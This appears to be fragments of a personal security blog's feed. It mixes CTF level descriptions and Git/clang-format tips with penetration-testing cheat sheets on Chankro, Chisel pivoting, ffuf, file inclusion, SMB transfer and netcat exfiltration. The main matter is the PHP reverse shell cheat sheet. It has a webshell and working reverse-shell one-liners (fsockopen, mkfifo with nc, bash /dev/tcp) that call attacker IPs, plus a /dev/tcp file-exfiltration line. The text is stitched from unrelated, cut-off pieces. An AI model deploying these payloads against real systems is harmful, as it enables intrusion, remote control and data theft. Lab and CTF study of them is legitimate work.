      <description>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!)</description>

      <description>The password for the next level is stored in `/etc/bandit_pass/bandit14` and can only be read by user `bandit14`. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. **Note:** `localhost` is a hostname that refers to the machine you are working on.</description>

      <description>The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</description>

      <description>To gain access to the next level, you should use the `setuid` binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place `(/etc/bandit_pass)`, after you have used the setuid binary.</description>

      <description>There is a setuid `binary` in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level `bandit20`. If the password is correct, it will transmit the password for the next level `bandit21`.</description>

      <description>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pin code. There is no way to retrieve the pin code except by going through all the 10000 combinations, called brute-forcing.</description>

      <description>&lt;p&gt;&lt;em&gt;by QwenAI | Verified on Arch Linux + NetworkManager ≥ 1.18&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;✅ &lt;strong&gt;Goal&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apply the &lt;em&gt;same&lt;/em&gt; spoofed MAC to &lt;strong&gt;all Wi-Fi connections&lt;/strong&gt; (global).&lt;/li&gt;
&lt;li&gt;Optionally set a custom &lt;strong&gt;DHCP hostname&lt;/strong&gt; per network (e.g., &lt;code&gt;Galaxy-A06&lt;/code&gt; instead of &lt;code&gt;Nix&lt;/code&gt;).&lt;br&gt;

      <description>&lt;p&gt;To copy the content from the &lt;code&gt;dev&lt;/code&gt; branch to the &lt;code&gt;stable&lt;/code&gt; branch in Git, you have a few options depending on your specific needs. Here are some common methods:&lt;/p&gt;
&lt;p&gt;This will combine the histories of the two branches, creating a merge commit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Switch to the stable branch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git checkout stable
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Merge the dev branch into stable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git merge dev
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-rebase-stable-onto-dev&#34;&gt;2. Rebase &lt;code&gt;stable&lt;/code&gt; onto &lt;code&gt;dev&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;This will move the &lt;code&gt;stable&lt;/code&gt; branch to the tip of the &lt;code&gt;dev&lt;/code&gt; branch, applying the changes from &lt;code&gt;stable&lt;/code&gt; on top of &lt;code&gt;dev&lt;/code&gt;. This creates a linear history.&lt;/p&gt;</description>

      <description>&lt;p&gt;Hydra is a powerful tool used for performing brute-force attacks on various services. In this tutorial, we&amp;rsquo;ll explore brute-forcing login pages using different HTTP methods with Hydra.&lt;/p&gt;
&lt;h4 id=&#34;brute-force-login-page-with-http-get-method&#34;&gt;Brute Force Login Page with HTTP GET Method:&lt;/h4&gt;

      <description>&lt;p&gt;Sometimes &lt;code&gt;system&lt;/code&gt;, &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;shell_exec&lt;/code&gt;, and other dangerous PHP functions are disabled. &lt;code&gt;Chankro&lt;/code&gt; helps us bypass these by using &lt;code&gt;LD_PRELOAD&lt;/code&gt; and custom shared objects.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-step-by-step-guide&#34;&gt;🧠 Step-by-Step Guide&lt;/h2&gt;
&lt;h3 id=&#34;-1-identify-target-architecture&#34;&gt;🔍 1. Identify Target Architecture&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Access the &lt;code&gt;phpinfo.php&lt;/code&gt; page on the target.&lt;/li&gt;
&lt;li&gt;Look for architecture info:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Architecture =&amp;gt; x86_64&lt;/code&gt; → 64-bit&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Architecture =&amp;gt; i686&lt;/code&gt; or &lt;code&gt;i386&lt;/code&gt; → 32-bit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;

      <title>Chisel Port Forwarding Guide</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/</link>

      <description>&lt;hr&gt;
&lt;h2 id=&#34;-what-is-chisel&#34;&gt;🧠 What is Chisel?&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Chisel&lt;/strong&gt; is a fast TCP/UDP tunnel over HTTP, useful for &lt;strong&gt;port forwarding&lt;/strong&gt; and &lt;strong&gt;pivoting&lt;/strong&gt;, especially during red teaming or CTFs.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-attacker-machine-setup-chisel-server&#34;&gt;🔥 Attacker Machine Setup (Chisel Server)&lt;/h2&gt;
&lt;p&gt;Start Chisel in &lt;strong&gt;reverse mode&lt;/strong&gt; on the attacker machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./chisel_1.5.1 server -p &lt;span class=&#34;m&#34;&gt;9005&lt;/span&gt; --reverse
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-p 9005&lt;/code&gt;: Listen on port 9005&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--reverse&lt;/code&gt;: Accept reverse port forwarding connections&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-target-machine-setup-chisel-client&#34;&gt;🎯 Target Machine Setup (Chisel Client)&lt;/h2&gt;
&lt;h3 id=&#34;forward-all-traffic-to-attacker&#34;&gt;Forward all traffic to attacker:&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./chisel client 10.10.14.19:9005 R:socks
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;This sets up a &lt;strong&gt;SOCKS proxy&lt;/strong&gt; from the target to the attacker&amp;rsquo;s Chisel server&lt;/p&gt;</description>

      <description>&lt;p&gt;The &lt;code&gt;clang-format&lt;/code&gt; tool works for multiple programming languages, not just C or C++. It supports:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;C&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;C++&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Objective-C&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Objective-C++&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Java&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;C#&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Protobuf&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TableGen&lt;/strong&gt;, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;style-1-using-stroustrup-brace-style&#34;&gt;Style 1: Using Stroustrup Brace Style&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Uses Stroustrup-style braces (&lt;code&gt;else&lt;/code&gt; on a new line).&lt;/li&gt;
&lt;li&gt;Short &lt;code&gt;if&lt;/code&gt; statements are allowed on a single line.&lt;/li&gt;
&lt;li&gt;Template declarations always break.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;AllowShortIfStatementsOnASingleLine&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;AlwaysBreakTemplateDeclarations&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Standard&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C++11&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;BreakBeforeBraces&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Stroustrup&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;ColumnLimit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;style-2-custom-style&#34;&gt;Style 2: Custom Style&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Based on LLVM style but customized.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;else&lt;/code&gt; goes on a new line.&lt;/li&gt;
&lt;li&gt;Braces after functions and control statements are on the same line.&lt;/li&gt;
&lt;li&gt;Compact and clean layout.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Basic Directory Fuzzing&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Fuzz common directory names (e.g., &lt;code&gt;/admin/&lt;/code&gt;, &lt;code&gt;/uploads/&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;2-fuzzing-parameters&#34;&gt;&lt;strong&gt;2. Fuzzing Parameters&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Basic Parameter Fuzzing&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffuf -w wordlist.txt -u https://example.com/page.php?param&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FUZZ
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Replaces &lt;code&gt;FUZZ&lt;/code&gt; with words from the wordlist to test URL parameters.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Filter by Status Code&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffuf -w wordlist.txt -u https://example.com/page.php?param&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FUZZ -mc &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Shows responses only for the &lt;code&gt;200 OK&lt;/code&gt; status code.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Filter by Content Size&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffuf -w wordlist.txt -u https://example.com/page.php?param&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FUZZ -fs &lt;span class=&#34;m&#34;&gt;150&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Filters results based on exact response size in bytes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;

      <title>File Inclusion</title>
      <link>http://localhost:1313/posts/penetration-testing/webvulnerability/lfi/</link>

      <description>&lt;h1 id=&#34;file-inclusion-and-path-traversal&#34;&gt;File Inclusion and Path Traversal&lt;/h1&gt;
&lt;h2 id=&#34;at-a-glance&#34;&gt;At a Glance&lt;/h2&gt;
&lt;p&gt;File inclusion is the method for applications, and scripts, to include local or remote files during run-time. The vulnerability occurs when an application generates a path to executable code using an attacker-controlled variable, giving the attacker control over which file is executed.&lt;/p&gt;
&lt;p&gt;There are two different types. &lt;strong&gt;Local File Inclusion&lt;/strong&gt; (LFI) where the application includes files on the current server. And &lt;strong&gt;Remote File Inclusion&lt;/strong&gt; (RFI) where the application downloads and execute files from a remote server. &lt;a href=&#34;#fn:1&#34;&gt;1&lt;/a&gt;&lt;/p&gt;</description>

&lt;h2 id=&#34;-on-the-linux-server-attacker-machine&#34;&gt;🖥️ On the Linux Server (Attacker Machine)&lt;/h2&gt;
&lt;p&gt;Start an SMB server using &lt;code&gt;impacket-smbserver&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo smbserver.py gnu &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; -smb2support
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gnu&lt;/code&gt;: Share name&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$(pwd)&lt;/code&gt;: Current working directory to be shared&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-smb2support&lt;/code&gt;: Enables SMB2 support for better compatibility with newer Windows systems&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-on-the-windows-client-victim-machine&#34;&gt;🪟 On the Windows Client (Victim Machine)&lt;/h2&gt;
&lt;p&gt;Access the shared file using UNC path:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\\10.10.14.42\gnu\winPEAS.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;🔸 Replace &lt;code&gt;10.10.14.42&lt;/code&gt; with the IP of your Linux (attacker) machine
🔸 You can also map this as a network drive or copy files directly using &lt;code&gt;copy&lt;/code&gt; or &lt;code&gt;xcopy&lt;/code&gt; in CMD or PowerShell&lt;/p&gt;</description>

      <description>&lt;h2 id=&#34;-step-1-start-listening-on-local-machine-kali&#34;&gt;🖥️ Step 1: Start Listening on Local Machine (Kali)&lt;/h2&gt;
&lt;p&gt;Run the following command to start listening for incoming files:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;gt; filename    &lt;span class=&#34;c1&#34;&gt;# waiting for receiving the files&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-step-2-transfer-file-from-remote-machine-victim&#34;&gt;📤 Step 2: Transfer File from Remote Machine (Victim)&lt;/h2&gt;
&lt;p&gt;Run this command on the victim machine to send the file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -w &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 10.10.14.19 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;lt; filename    &lt;span class=&#34;c1&#34;&gt;# it&amp;#39;s time to send the file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;, use this alternative method:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat filename &amp;gt; /dev/tcp/10.10.14.19/4444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code&gt;10.10.14.19&lt;/code&gt; is the IP address of the &lt;strong&gt;local machine (tun0)&lt;/strong&gt;.&lt;/p&gt;</description>

      <title>PHP Reverse Shell &amp; Webshell Cheat Sheet</title>
      <link>http://localhost:1313/posts/penetration-testing/webvulnerability/-php-reverse-shell--webshell-cheat-sheet/</link>

      <guid>http://localhost:1313/posts/penetration-testing/webvulnerability/-php-reverse-shell--webshell-cheat-sheet/</guid>
      <description>&lt;p&gt;This cheat sheet contains common PHP reverse shells and webshell snippets that work in different scenarios.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;1-basic-webshell-using-system&#34;&gt;1. Basic Webshell Using &lt;code&gt;system()&lt;/code&gt;&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Usage: Execute commands by passing &lt;code&gt;cmd&lt;/code&gt; parameter in URL.&lt;/li&gt;
&lt;li&gt;Example: &lt;code&gt;http://target.com/webshell.php?cmd=ls&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;2-php-reverse-shell-using-one-liner-with-fsockopen&#34;&gt;2. PHP Reverse Shell Using One-liner with &lt;code&gt;fsockopen()&lt;/code&gt;&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;$sock=fsockopen(&amp;#34;10.9.50.114&amp;#34;,3232);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Run this on target if you can execute PHP code directly.&lt;/li&gt;
&lt;li&gt;Connects back to your listener on port &lt;code&gt;3232&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;3-php-reverse-shell-using-named-pipe--netcat&#34;&gt;3. PHP Reverse Shell Using Named Pipe &amp;amp; Netcat&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.9.50.114 4242 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Uses a named pipe (&lt;code&gt;/tmp/f&lt;/code&gt;) for stable reverse shell.&lt;/li&gt;
&lt;li&gt;Requires &lt;code&gt;nc&lt;/code&gt; (Netcat) on the target machine.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4-php-one-liner-bash-reverse-shell-backgrounded&#34;&gt;4. PHP One-liner Bash Reverse Shell (Backgrounded)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nohup /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.5/9001 0&amp;gt;&amp;amp;1&amp;#39; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Runs bash reverse shell in the background.&lt;/li&gt;
&lt;li&gt;Useful to keep shell persistent after HTTP request ends.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;-tips--notes&#34;&gt;🔥 Tips &amp;amp; Notes&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Replace IP and ports with your attacker machine’s IP and desired port.&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;nc -lvnp &amp;lt;port&amp;gt;&lt;/code&gt; on your machine to catch the reverse shell.&lt;/li&gt;
&lt;li&gt;Some functions like &lt;code&gt;exec()&lt;/code&gt;, &lt;code&gt;system()&lt;/code&gt; might be disabled — test alternatives (&lt;code&gt;passthru()&lt;/code&gt;, &lt;code&gt;shell_exec()&lt;/code&gt;, &lt;code&gt;popen()&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;nc&lt;/code&gt; is not installed on the target, try pure PHP or &lt;code&gt;bash&lt;/code&gt; based shells.&lt;/li&gt;
&lt;li&gt;Always check if the web server user has permissions to execute commands or create named pipes.&lt;/li&gt;
&lt;li&gt;Combine these shells with &lt;code&gt;Chankro&lt;/code&gt; or &lt;code&gt;php-reverse-shell&lt;/code&gt; for better evasion.&lt;/li&gt;

      <title>Python Reverse Shell Cheat Sheet</title>

      <guid>http://localhost:1313/posts/penetration-testing/webvulnerability/-python-reverse-shell-cheat-sheet/</guid>
      <description>&lt;p&gt;This cheat sheet shows useful Python reverse shell one-liners and a PowerShell reverse shell generator in Python.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;1-python3-reverse-shell-one-liner&#34;&gt;1. Python3 Reverse Shell One-liner&lt;/h2&gt;
